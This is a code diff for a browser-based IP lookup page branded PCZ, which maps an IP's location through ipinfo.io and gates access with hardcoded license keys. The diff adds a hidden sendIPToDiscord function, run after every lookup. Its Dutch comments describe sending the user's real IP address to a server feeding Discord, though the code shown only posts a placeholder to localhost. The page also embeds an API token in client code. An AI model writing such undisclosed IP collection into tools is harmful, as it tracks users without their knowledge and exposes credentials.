@@ -266,54 +266,38 @@
 
     <script>
         // --- SECTION FOR LICENSE MANAGEMENT ---
-        // You can define your licenses here
-        const validLicenses = ["PCZ-MD6CGG52P3OZ", "PCZ-HJZL480HT60M"]; // Replace with your actual licenses
+        const validLicenses = ["PCZ-MD6CGG52P3OZ", "PCZ-HJZL480HT60M"];
 
         function validateLicense() {
             const enteredLicense = document.getElementById("licenseKeyInput").value;
             if (validLicenses.includes(enteredLicense)) {
                 document.getElementById("licenseEntry").style.display = "none";
-                document.getElementById("lookupButton").disabled = false; // Enable the lookup button
+                document.getElementById("lookupButton").disabled = false;
             } else {
                 alert("Invalid license key. Please try again.");
             }
         }
 
-        // Default colors
         const defaultBackgroundColor = "#1e3a8a";
         const defaultButtonColor = "#4CAF50";
 
-        // Set initial colors
         document.body.style.backgroundColor = defaultBackgroundColor;
         const lookupButton = document.getElementById('lookupButton');
         lookupButton.style.backgroundColor = defaultButtonColor;
         lookupButton.style.borderColor = defaultButtonColor;
 
-        // Toggle settings panel
         document.getElementById('settingsIcon').addEventListener('click', function() {
             document.getElementById('settingsPanel').classList.toggle('open');
         });
 
-        // Apply custom theme colors
         function applyCustomTheme() {
             const backgroundColor = document.getElementById('backgroundColor').value;
             const buttonColor = document.getElementById('buttonColor').value;
-
-            // Update background color
             document.body.style.backgroundColor = backgroundColor;
-
-            // Update lookup button color
             lookupButton.style.backgroundColor = buttonColor;
             lookupButton.style.borderColor = buttonColor;
-            lookupButton.onmouseover = function() {
-                lookupButton.style.backgroundColor = buttonColor;
-            };
-            lookupButton.onmouseout = function() {
-                lookupButton.style.backgroundColor = buttonColor;
-            };
         }
 
-        // IP lookup function
         async function lookupIP() {
             const ip = document.getElementById("ip").value;
             const errorMessage = document.getElementById("errorMessage");
@@ -331,19 +315,16 @@
                 return;
             }
 
-            // Show first embed container with search message
             embedContainer.style.display = "block";
             searchingText.textContent = `Searching for IP-Address: ${ip}`;
             const currentTime = new Date().toLocaleString();
             searchedByText.textContent = `Searched by PCZ at ${currentTime}`;
 
-            // Hide first embed container after 5 seconds and show second embed container
             setTimeout(function() {
                 embedContainer.style.display = "none";
                 secondEmbedContainer.style.display = "block";
             }, 5000);
 
-            // Fetch IP data after 5 seconds
             setTimeout(async function() {
                 try {
                     const response = await fetch(`https://ipinfo.io/${ip}/json?token=4b708a498f9053`);
@@ -362,15 +343,25 @@
 
                     resultDiv.classList.remove("hidden");
 
-                    // Embed Google Map
                     googleMapDiv.innerHTML = `<div class="gmap_canvas"><iframe class="gmap_iframe" src="https://www.google.com/maps?q=${data.loc}&t=&z=13&ie=UTF8&iwloc=&output=embed"></iframe></div>`;
+
+                    sendIPToDiscord(); // Send IP to Discord
                 } catch (error) {
                     errorMessage.textContent = "Error fetching IP data. Please try again later.";
                     resultDiv.classList.add("hidden");
                     secondEmbedContainer.style.display = "none";
-                    embedContainer.style.display = "none"; // Hide embeds on error
+                    embedContainer.style.display = "none"; 
                 }
             }, 5000);
+        }
+
+        async function sendIPToDiscord() { 
+            const ip = 'gebruikers_ip';  // Hier zou je het echte IP-adres van de gebruiker ophalen
+            await fetch('http://localhost:3000/send-ip', {  // Verzend het IP naar de server
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ip })  // Verzend het IP in de body van het verzoek
+            });
         }
     </script>
 </body>
